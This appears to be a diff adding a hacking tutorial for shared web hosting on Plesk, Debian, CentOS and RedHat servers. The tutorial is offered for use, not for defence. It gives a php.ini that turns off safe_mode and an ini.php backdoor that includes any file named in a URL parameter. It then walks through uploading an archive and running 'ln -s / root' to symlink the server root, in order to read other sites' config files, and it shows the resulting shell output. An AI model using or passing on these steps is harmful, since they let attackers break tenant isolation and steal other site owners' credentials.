@@ -1,0 +1,32 @@
+First Before Starting to symlink we need to create php.ini and ini.php to Disable Safe mode and Disabled Functions on the server .
+Use the Following Code :
+Make a php.ini with the following code
+safe_mode=Off
+And ini.php with
+<?
+echo ini_get("safe_mode");
+echo ini_get("open_basedir");
+include($_GET["file"]);
+ini_restore("safe_mode");
+ini_restore("open_basedir");
+echo ini_get("safe_mode");
+echo ini_get("open_basedir");
+include($_GET["ss"]);
+?>
+I will post the Download link of the files i use on the end of the tutorial .
+So after creating php.ini and ini.php upload the other files to the server .
+BYPASSING SYMLINK ON PLESK , DEBIAN , CENTOS & REDHAT SERVERS
+Now i will explain how to bypass symlink on Plesk , Debian , Centos and Redhat
+Commonly all of the above have root path like
+/root/var/www/vhost/
+where all sites will be under vhost directory  . But you wont have permission to view it so we will create a symbolic link to root and view the site and symlink the config files
+Make a new directory in your shell example sen then upload sen.zip . Then use this command to unzip the file and create a symbolic link to root .
+Command : unzip sen.zip
+Note : In some servers unzip command wont work so you can manually create a symlink to root by using the command ln -s / root
+Then You will see this
+$ unzip sen.zip
+Archive:  sen.zip
+    linking: sen.txt                 -> /
+finishing deferred symbolic links:
+  sen.txt                -> /
+This means a symbolic link has been created to / root .
